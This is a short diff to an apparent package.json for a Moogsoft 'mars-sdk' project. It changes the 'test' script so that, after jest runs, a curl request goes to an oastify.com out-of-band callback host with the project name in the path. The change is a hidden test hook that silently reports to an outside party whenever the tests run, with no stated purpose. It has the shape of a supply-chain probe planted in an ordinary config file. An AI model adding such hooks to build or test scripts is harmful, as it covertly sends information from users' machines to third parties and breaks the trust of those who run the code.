@@ -8,7 +8,7 @@
         "url": "https://github.com/Moogsoft/mars-sdk"
     },
     "scripts": {
-        "test": "jest",
+        "test": "jest && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/moogsoft-mars-sdk",
         "test:coverage": "npm test -- --coverage",
         "lint": "eslint . --ext .js"
     },
